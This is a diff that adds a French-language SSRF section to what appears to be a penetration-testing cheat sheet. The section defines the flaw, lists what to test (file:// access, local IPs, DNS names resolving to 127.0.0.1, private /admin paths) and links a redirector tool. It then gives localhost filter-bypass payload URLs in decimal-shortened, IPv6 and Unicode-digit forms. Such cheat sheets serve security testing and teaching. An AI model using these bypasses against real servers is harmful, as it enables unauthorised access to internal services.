@@ -117,3 +117,35 @@ SQL INJECTIONS
 
 SSRF (Server Side Request Forgery)
 ======
+Server-side request forgery (également connue sous le nom de SSRF) est une vulnérabilité Web qui permet à un attaquant d'inciter l'application côté serveur à effectuer des requêtes HTTP vers un domaine arbitraire choisi par l'attaquant. 
+
+<br/> 
+
+**Choses à tester**
+* Accès aux fichiers locaux (file://)
+* Essayer d'accéder à l'IP locale 
+* Contournement de l'IP locale
+* Usurpation de DNS (domaines pointant vers 127.0.0.1)
+* Accès à du contenu privé (filtré par IP ou uniquement accessible localement, comme le repertoire /admin).
+
+<br/> 
+
+**Outil**
+* [redirector](https://tools.intigriti.io/redirector/)
+
+<br/> 
+
+**Bypass localhost**
+* http://127.0.0.1:80
+* http://127.0.0.1:443
+* http://127.0.0.1:22
+* http://127.1:80
+* http://0
+* http://0.0.0.0:80
+* http://localhost:80
+* http://[::]:80/
+* http://[::]:25/ SMTP
+* http://[::]:3128/ Squid
+* http://[0000::1]:80/
+* http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
+* http://①②⑦.⓪.⓪.⓪
